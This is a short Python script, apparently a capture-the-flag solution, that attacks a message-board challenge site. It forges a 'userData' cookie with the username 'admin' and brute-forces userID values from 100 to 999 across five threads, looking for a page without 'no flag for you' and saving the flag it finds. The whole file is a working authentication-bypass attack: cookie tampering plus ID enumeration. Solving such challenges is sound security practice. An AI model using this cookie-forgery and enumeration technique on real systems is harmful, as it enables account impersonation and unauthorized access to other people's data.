import requests
import re
from threading import Thread


def printFlag(html, id):
    match = re.search(r'flag{[^}]*}', html)
    if match:
        print(f"{id=}")
        print(match.group(0))
        with open('flag.txt', 'w') as f:
            f.write(match.group(0))
        exit(0)


def run100():
    for i in range(100, 200):
        cookies = {
            "userData": 'j:{"userID":"' + str(i)+'","username":"admin"}'
        }
        r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

        if "no flag for you" not in str(r.text):
            printFlag(r.text, i)
        else:
            pass


def run200():
    for i in range(200, 400):
        cookies = {
            "userData": 'j:{"userID":"' + str(i)+'","username":"admin"}'
        }
        r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

        if "no flag for you" not in str(r.text):
            printFlag(r.text, i)
        else:
            pass


def run400():
    for i in range(400, 600):
        cookies = {
            "userData": 'j:{"userID":"' + str(i)+'","username":"admin"}'
        }
        r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

        if "no flag for you" not in str(r.text):
            printFlag(r.text, i)
        else:
            pass


def run600():
    for i in range(600, 800):
        cookies = {
            "userData": 'j:{"userID":"' + str(i)+'","username":"admin"}'
        }
        r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

        if "no flag for you" not in str(r.text):
            printFlag(r.text, i)
        else:
            pass


def run800():
    for i in range(800, 1000):
        cookies = {
            "userData": 'j:{"userID":"' + str(i)+'","username":"admin"}'
        }
        r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

        if "no flag for you" not in str(r.text):
            printFlag(r.text, i)
        else:
            pass


workers = [run100, run200, run400, run600, run800]

threads = []

for worker in workers:
    t = Thread(target=worker)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
